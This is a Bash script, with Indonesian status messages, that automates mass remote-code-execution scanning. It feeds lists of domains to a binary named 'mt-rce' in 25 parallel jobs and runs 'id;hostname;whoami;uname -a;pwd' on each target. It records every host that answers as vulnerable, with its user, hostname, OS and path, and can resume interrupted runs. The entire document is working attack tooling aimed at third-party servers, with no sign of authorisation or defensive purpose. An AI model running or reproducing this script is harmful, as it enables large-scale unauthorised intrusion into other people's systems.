#!/bin/bash
# batch-domains.sh - Proses folder domains/
# Usage: ./batch-domains.sh [-o output_dir]

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

THREADS=25
TIMEOUT=15
MAX_WAIT=45
BINARY="./mt-rce"
DOMAINS_DIR="domains"
OUTPUT_BASE=""
while getopts "o:" opt; do
    case $opt in
        o) OUTPUT_BASE="$OPTARG" ;;
    esac
done

extract_domain() {
    local url="$1"
    url=$(echo "$url" | sed -E 's|^https?://||' | cut -d'/' -f1 | cut -d':' -f1)
    echo "$url" | tr '.' '_' | tr ':' '_'
}

wait_for_network() {
    while true; do
        if ping -c 1 -W 2 8.8.8.8 &>/dev/null; then return 0; fi
        if curl -s --connect-timeout 3 http://google.com &>/dev/null; then return 0; fi
        echo -e "${YELLOW}[!] Menunggu jaringan...${NC}"
        sleep 5
    done
}

mapfile -t FILES < <(ls "$DOMAINS_DIR"/*.txt 2>/dev/null | sort -V)
[ ${#FILES[@]} -eq 0 ] && { echo "No .txt files in $DOMAINS_DIR"; exit 1; }

for filepath in "${FILES[@]}"; do
    filename=$(basename "$filepath")
    filebase="${filename%.txt}"
    if [ -n "$OUTPUT_BASE" ]; then
        OUTDIR="$OUTPUT_BASE/$filebase"
    else
        OUTDIR="$DOMAINS_DIR/output/$filebase"
    fi
    mkdir -p "$OUTDIR/vulnerable"

    if [ ! -f "$OUTDIR/targets_clean.txt" ]; then
        tr -d '\r' < "$filepath" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | grep -v '^$' > "$OUTDIR/targets_clean.txt"
    fi

    TOTAL=$(wc -l < "$OUTDIR/targets_clean.txt")
    START_LINE=0
    [ -f "$OUTDIR/sampai-mana.txt" ] && START_LINE=$(cat "$OUTDIR/sampai-mana.txt")
    echo "[*] $filename ($TOTAL domains, start at $START_LINE)"

    if [ ! -f "$OUTDIR/results.csv" ]; then
        echo "STATUS|ENDPOINT_URL|USER_ID|HOSTNAME|OS_INFO|PWD" > "$OUTDIR/results.csv"
    fi

    scan_domain() {
        local target="$1" num="$2" out="$3" tot="$4"
        local output
        output=$(timeout "$MAX_WAIT" "$BINARY" -u "$target" -c "id;hostname;whoami;uname -a;pwd" -t "$TIMEOUT" 2>&1)
        local exit_code=$?
        if [ $exit_code -eq 124 ]; then
            echo "$num|TIMEOUT|$target|N/A|N/A|N/A|N/A" >> "$out/results.tmp"
            echo -e "${YELLOW}[$num/$tot] SKIP: $target${NC}"
        elif echo "$output" | grep -q "uid="; then
            local endpoint_url=$(echo "$output" | grep -oP '\[0\] \K(https?://[^\s]+)' | head -1)
            [ -z "$endpoint_url" ] && endpoint_url="$target"
            local cmd_output=$(echo "$output" | sed -n '/Executing:/,$p' | tail -n +2)
            local user_id=$(echo "$cmd_output" | grep -oP 'uid=\d+\(\w+\)[^)]*\)' | head -1 | tr -d '\n\r')
            local hostname=$(echo "$cmd_output" | grep -v 'uid=' | grep -v 'Executing' | grep -v '^\[' | grep -v '^$' | grep -v 'Linux' | head -1 | tr -d '\n\r')
            local os_info=$(echo "$cmd_output" | grep -i 'Linux\|GNU/Linux' | head -1 | tr -d '\n\r')
            local pwd=$(echo "$cmd_output" | grep -oP '^/[\w/]+' | head -1 | tr -d '\n\r')
            local domain_safe=$(extract_domain "$endpoint_url")

            echo "$num|VULNERABLE|$endpoint_url|$user_id|$hostname|$os_info|$pwd" >> "$out/results.tmp"
            echo "$endpoint_url" >> "$out/vulnerable_urls.txt"
            cat > "$out/vulnerable/${domain_safe}.txt" << EOF
VULNERABLE TARGET DETAIL
TARGET: $target
ENDPOINT: $endpoint_url
USER: $user_id
HOSTNAME: $hostname
OS: $os_info
PWD: $pwd
OUTPUT:
$cmd_output
EOF
            echo -e "${GREEN}[$num/$tot] VULN: $endpoint_url${NC}"
        else
            echo "$num|NOT_VULNERABLE|$target|N/A|N/A|N/A|N/A" >> "$out/results.tmp"
            echo -e "${RED}[$num/$tot] NOT: $target${NC}"
        fi
    }
    export -f scan_domain extract_domain wait_for_network
    export RED GREEN YELLOW CYAN NC BINARY TIMEOUT MAX_WAIT

    > "$OUTDIR/results.tmp"
    local line_num=$START_LINE
    local running=0
    while IFS= read -r domain; do
        line_num=$((line_num+1))
        wait_for_network
        scan_domain "$domain" "$line_num" "$OUTDIR" "$TOTAL" &
        running=$((running+1))
        [ $running -ge $THREADS ] && { wait -n; running=$((running-1)); }
        [ $((line_num % 10)) -eq 0 ] && echo "$line_num" > "$OUTDIR/sampai-mana.txt"
    done < <(tail -n +$((START_LINE+1)) "$OUTDIR/targets_clean.txt")
    wait
    if [ -f "$OUTDIR/results.tmp" ]; then
        sort -t'|' -k1 -n "$OUTDIR/results.tmp" | cut -d'|' -f2- >> "$OUTDIR/results.csv"
        rm "$OUTDIR/results.tmp"
    fi
    echo "$line_num" > "$OUTDIR/sampai-mana.txt"
    echo "[✓] $filename selesai"
done